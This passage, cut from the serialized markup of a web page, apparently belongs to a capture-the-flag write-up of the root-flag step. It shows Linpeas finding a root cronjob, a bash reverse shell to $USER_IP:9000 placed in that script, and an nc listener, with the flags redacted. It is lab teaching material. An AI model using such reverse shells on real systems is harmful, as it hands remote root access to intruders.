items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"flag{________________}\"}],[\"$\",\"span\",\"312\",{\"children\":\".\"}]]}],[\"$\",\"h3\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl\",\"children\":[[\"$\",\"span\",\"315\",{\"children\":\"Root Flag\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"318\",{\"children\":\"Uploading\"}],\"\\r\\n\",[\"$\",\"$Le\",null,{\"title\":\"\",\"className\":\"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600\",\"href\":\"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite\",\"children\":[[\"$\",\"span\",\"321\",{\"children\":\"Linpeas\"}]]}],\"\\r\\n\",[\"$\",\"span\",\"324\",{\"children\":\"on the box we can find a cronjob that is run as root and execute a script\"}],\"\\r\\n\",[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"/var/www/.mysecretcronjob.sh\"}],[\"$\",\"span\",\"327\",{\"children\":\".\"}]]}],[\"$\",\"$Lf\",\"331\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"330\",{\"children\":\"* *    * * *   root    cd /var/www/ \u0026\u0026 sudo bash .mysecretcronjob.sh\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"333\",{\"children\":\"We can put a reverse shell in the script to gain root access on the box.\"}]]}],[\"$\",\"$Lf\",\"337\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"336\",{\"children\":\"bash -i \u003e\u0026 /dev/tcp/$USER_IP/9000 0\u003e\u00261\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"339\",{\"children\":\"Open a listener and wait for the job to fire.\"}]]}],[\"$\",\"$Lf\",\"343\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"342\",{\"children\":\"nc -lvnp 9000\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"345\",{\"children\":\"The root flag is in a file \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"/root/.root.txt\"}]]}],[\"$\",\"$Lf\",\"350\",{\"language\":\"\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"349\",{\"children\":\"flag{________________________________}\\n\"}]]}]]}]\n"])</script>